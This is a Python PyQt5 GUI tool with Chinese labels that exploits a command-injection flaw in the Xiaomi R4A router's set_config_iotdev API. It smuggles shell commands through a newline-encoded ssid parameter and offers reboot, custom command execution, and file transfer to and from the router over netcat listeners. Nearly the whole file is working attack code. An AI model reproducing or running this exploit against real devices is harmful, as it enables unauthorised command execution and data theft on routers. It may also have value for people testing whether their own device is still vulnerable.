import sys
import threading
import urllib.parse
import base64
import requests
import time
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QMessageBox, QHBoxLayout, QComboBox, QFileDialog,
    QTextEdit
)

from PyQt5.QtCore import QMetaObject, Qt
from PyQt5.QtCore import pyqtSlot

from netcat import send_file, receive_file 

from enum import Enum

get_url_template = 'http://{0}/cgi-bin/luci/;stok={1}/api/misystem/set_config_iotdev?bssid=XXXXX&user_id=XXXXX&ssid=-h%0A{2}%0A'


local_send_cmd_template = 'nc -l 1234 < {0}'
local_receive_cmd_template = 'nc -l 1234 > {0}'

router_send_cmd_template = 'nc {0} 1234 > {1}'
router_receive_cmd_template = 'nc {0} 1234 < {1}'

local_intermediate_file = './router_output.txt'
router_intermediate_file = '/tmp/router_output.txt'

class ExecuteChoice(Enum):
    REBOOT = 0
    SEND = 1
    RECEIVE = 2
    CUSTOM = 3

class TestAvailableApp(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):

        self.port = 1234
        self

        # 📢 使用說明
        self.notice_label = QLabel("⚠ 請先用有線或無線網路連上路由器", self)

        # 路由器 IP
        self.router_ip_label = QLabel("路由器 IP：", self)
        self.router_ip_input = QLineEdit(self)
        self.router_ip_input.setText("192.168.31.1")
        



        # STOK 欄位
        self.stok_label = QLabel("STOK（請自行貼上）：", self)
        self.stok_input = QLineEdit(self)

        # shell 指令
        self.execute_combo_label = QLabel("欲執行的指令類型：", self)
        self.execute_combo = QComboBox(self)
        self.execute_combo.addItems(["重啟路由器", "上傳檔案到路由器", "從路由器下載檔案", "自定義指令"])
        self.execute_combo.currentIndexChanged.connect(self.update_labels)
        self.router_cmd_label = QLabel("路由器執行指令：", self)
        self.router_cmd_input = QLineEdit(self)
        self.router_cmd_input.setText("reboot")
        

        self.local_cmd_label = QLabel("本機執行指令：", self)
        self.local_cmd_input = QLineEdit(self)
        self.local_cmd_input.setText("")
        self.local_cmd_label.hide()
        self.local_cmd_input.hide()


        # 本機 IP
        self.local_ip_label = QLabel("本機 IP (上傳下載使用)：", self)
        self.local_ip_input = QLineEdit(self)
        self.local_ip_input.setText("192.168.31.236")
        self.local_ip_label.hide()
        self.local_ip_input.hide()
        self.local_ip_input.textChanged.connect(self.update_labels)

        self.local_path_label = QLabel("本機檔案路徑：", self)
        self.local_path_input = QLineEdit(self)
        self.browse_local_path_btn = QPushButton("選擇檔案", self)
        self.browse_local_path_btn.clicked.connect(self.select_file)
        self.local_path_label.hide()
        self.local_path_input.hide()
        self.browse_local_path_btn.hide()
        self.local_path_input.textChanged.connect(self.update_labels)

        self.router_path_label = QLabel("路由器檔案路徑：", self)
        self.router_path_input = QLineEdit(self)
        self.router_path_label.hide()
        self.router_path_input.hide()
        self.router_path_input.setText('/tmp/file.txt')
        self.router_path_input.textChanged.connect(self.update_labels)



        # 執行按鈕
        self.execute_button = QPushButton("執行", self)
        self.execute_button.clicked.connect(self.execute_command)

        #self.result_label = QLabel("執行後觀察路由器是否重啟, 有則代表該漏洞仍可使用", self)


        self.get_router_output_btn = QPushButton("獲取路由器輸出", self)
        self.get_router_output_btn.clicked.connect(self.get_router_output)
        self.get_router_output_btn.hide()
        self.router_output_box = QTextEdit(self)
        self.router_output_box.setReadOnly(True)
        self.router_output_box.hide()
        

        # Layout
        layout = QVBoxLayout()
        layout.addWidget(self.notice_label)
        layout.addWidget(self.router_ip_label)
        layout.addWidget(self.router_ip_input)



        layout.addWidget(self.stok_label)
        layout.addWidget(self.stok_input)

        hlayout1 = QHBoxLayout()
        hlayout1.addWidget(self.execute_combo_label)
        hlayout1.addWidget(self.execute_combo)
        layout.addLayout(hlayout1)

        layout.addWidget(self.local_ip_label)
        layout.addWidget(self.local_ip_input)

        hlayout2 = QHBoxLayout()
        hlayout2.addWidget(self.local_path_label)
        hlayout2.addWidget(self.local_path_input)
        hlayout2.addWidget(self.browse_local_path_btn)
        layout.addLayout(hlayout2)

        hlayout3 = QHBoxLayout()
        hlayout3.addWidget(self.router_path_label)
        hlayout3.addWidget(self.router_path_input)
        layout.addLayout(hlayout3)

        hlayout4 = QHBoxLayout()
        hlayout4.addWidget(self.router_cmd_label)
        hlayout4.addWidget(self.router_cmd_input)
        layout.addLayout(hlayout4)

        hlayout5 = QHBoxLayout()
        hlayout5.addWidget(self.local_cmd_label)
        hlayout5.addWidget(self.local_cmd_input)
        layout.addLayout(hlayout5)

        layout.addWidget(self.execute_button)

        layout.addWidget(self.get_router_output_btn)
        layout.addWidget(self.router_output_box)
        #layout.addWidget(self.result_label)

        self.setLayout(layout)
        self.setWindowTitle('小米R4A set_config_iotdev 指令執行工具')
        self.setGeometry(300, 300, 500, 270)
        self.show()

    def select_file(self):
        execute_choice = ExecuteChoice(self.execute_combo.currentIndex())
        if execute_choice == ExecuteChoice.SEND:
            path, _ = QFileDialog.getOpenFileName(self, "選擇檔案")
        elif execute_choice == ExecuteChoice.RECEIVE:
            path, _ = QFileDialog.getSaveFileName(self, "選擇儲存位置")
        if path:
            self.local_path_input.setText(path)

    
   # def local_ip_input_changed(self, text):
        


    def update_local_cmd_input():
        self.local_cmd_input.setText(local_send_cmd_template.format(self.local_path_input.text()))

    def update_labels(self):
        execute_choice = ExecuteChoice(self.execute_combo.currentIndex())
        if execute_choice == ExecuteChoice.REBOOT: #重啟路由器
            self.router_cmd_input.setText("reboot")
            self.switch_local_ip_interface(False)
            self.switch_transfer_interface(False)
            self.switch_output_interface(False)
        elif execute_choice == ExecuteChoice.SEND: #上傳檔案到路由器
            self.router_cmd_input.setText(router_send_cmd_template.format(self.local_ip_input.text(),self.router_path_input.text()))
            self.switch_local_ip_interface(True)
            self.switch_transfer_interface(True)
            self.switch_output_interface(False)
            self.local_path_input.setText('./send.txt')
            self.local_cmd_input.setText(local_send_cmd_template.format(self.local_path_input.text()))
        elif execute_choice == ExecuteChoice.RECEIVE: #從路由器下載檔案
            self.router_cmd_input.setText(router_receive_cmd_template.format(self.local_ip_input.text(),self.router_path_input.text()))
            self.switch_local_ip_interface(True)
            self.switch_transfer_interface(True)
            self.switch_output_interface(False)
            self.local_path_input.setText('./receive.txt')
            self.local_cmd_input.setText(local_receive_cmd_template.format(self.local_path_input.text()))
        elif execute_choice == ExecuteChoice.CUSTOM: #自定義指令
            self.router_cmd_input.setText('enter your command here!')
            self.switch_local_ip_interface(True)
            self.switch_transfer_interface(False)
            self.switch_output_interface(True)

    def switch_local_ip_interface(self,visible):
        if visible:
            self.local_ip_label.show()
            self.local_ip_input.show()
        else:
            self.local_ip_label.hide()
            self.local_ip_input.hide()

    def switch_transfer_interface(self,visible):
        if visible:
            self.local_path_label.show()
            self.local_path_input.show()
            self.browse_local_path_btn.show()
            self.router_path_label.show()
            self.router_path_input.show()
            self.local_cmd_label.show()
            self.local_cmd_input.show()
        else:
            self.local_path_label.hide()
            self.local_path_input.hide()
            self.browse_local_path_btn.hide()
            self.router_path_label.hide()
            self.router_path_input.hide()
            self.local_cmd_label.hide()
            self.local_cmd_input.hide()
    
    def switch_output_interface(self,visible):
        if visible:
            self.router_output_box.show()
            self.get_router_output_btn.show() 
        else:
            self.router_output_box.hide()
            self.get_router_output_btn.hide()

    def execute_command(self):
        router_ip = self.router_ip_input.text()
        local_ip = self.local_ip_input.text()
        stok = self.stok_input.text()
        command = self.router_cmd_input.text()
        execute_choice = ExecuteChoice(self.execute_combo.currentIndex())
        require_transfer = (execute_choice == ExecuteChoice.SEND or execute_choice == ExecuteChoice.RECEIVE)
        path = self.local_path_input.text()
        port = self.port

        if stok == "":
            QMessageBox.warning(self, "失敗", f"尚未輸入stok")
            return

        if require_transfer:
            if local_ip == "":
                QMessageBox.warning(self, "失敗", f"尚未輸入本機ip")
                return

        if execute_choice == ExecuteChoice.CUSTOM:
            encoded_cmd = urllib.parse.quote(command + ' > ' + router_intermediate_file)
        else:
            encoded_cmd = urllib.parse.quote(command)
        
        if execute_choice == ExecuteChoice.SEND:
            threading.Thread(target=self.send_wrapper, args=(path, port), daemon=True).start()

        if execute_choice == ExecuteChoice.RECEIVE:
            threading.Thread(target=self.receive_wrapper, args=(path, port), daemon=True).start()

        try:
            response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
            if response.status_code == 200:
                QMessageBox.information(self, "成功", f"指令已送出。\n回應：{response.text}")
                if execute_choice == ExecuteChoice.CUSTOM:
                    self.get_router_output_btn.show()
                    self.router_output_box.show()
            else:
                QMessageBox.warning(self, "失敗", f"HTTP 回應碼：{response.status_code}\n回應：{response.text}")
        except Exception as e:
            QMessageBox.critical(self, "錯誤", f"連線失敗：{str(e)}")

    def get_router_output(self):
        threading.Thread(target=self.receive_wrapper, args=(local_intermediate_file, self.port), daemon=True).start()
        router_ip = self.router_ip_input.text()
        stok = self.stok_input.text()
        command = router_receive_cmd_template.format(self.local_ip_input.text(),router_intermediate_file)
        encoded_cmd = urllib.parse.quote(command)
        response = requests.get(get_url_template.format(router_ip, stok, encoded_cmd), timeout=5)
        with open(local_intermediate_file, 'r') as file:
            file_content = file.read()
            self.router_output_box.clear()
            self.router_output_box.append(file_content)


    def send_wrapper(self, path, port):
        success, msg = send_file(path, port)

    def receive_wrapper(self, path, port):
        success, msg = receive_file(path, port)

    @pyqtSlot(str, str)
    def show_message(self, title, message):
        QMessageBox.information(self, title, message)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = TestAvailableApp()
    sys.exit(app.exec_())
